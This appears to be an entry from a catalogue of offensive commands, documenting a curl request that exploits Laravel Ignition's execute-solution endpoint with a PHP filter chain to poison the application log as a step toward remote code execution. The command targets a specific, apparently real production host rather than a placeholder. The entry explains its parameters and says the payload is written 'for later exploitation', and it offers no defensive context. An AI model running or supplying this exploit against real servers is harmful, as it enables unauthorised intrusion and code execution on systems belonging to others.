---
data: >-
  curl -XPOST -H'Content-Type: application/json' -d
  '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"},}'
  https://mpos.mtn.co.sz/_ignition/execute-solution
tags:
  - rce
  - log-poisoning
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.579Z'
id: 455b9b63-9e18-4de7-af96-cd2a55182d42
verified: false
validated: true
submitted: true
---
# curl-ignition-payload-injection

## Command

```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

## Description

Injects a PHP filter chain to write a base64-encoded payload to the Laravel log file using Ignition's MakeViewVariableOptionalSolution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| viewFile | PHP stream wrapper chain for encoding/writing | Yes |
| variableName | Dummy parameter | Yes |
| solution | Ignition solution class | Yes |

## Examples

### Basic Usage

As above for log write.

### Advanced Usage

Customize base64 payload in filters.

## Expected Output

Error response; payload written to log for later exploitation.

## Related

- [[Related Procedure: Attempt-RCE-via-Ignition-Log-Poisoning-with-Curl]]
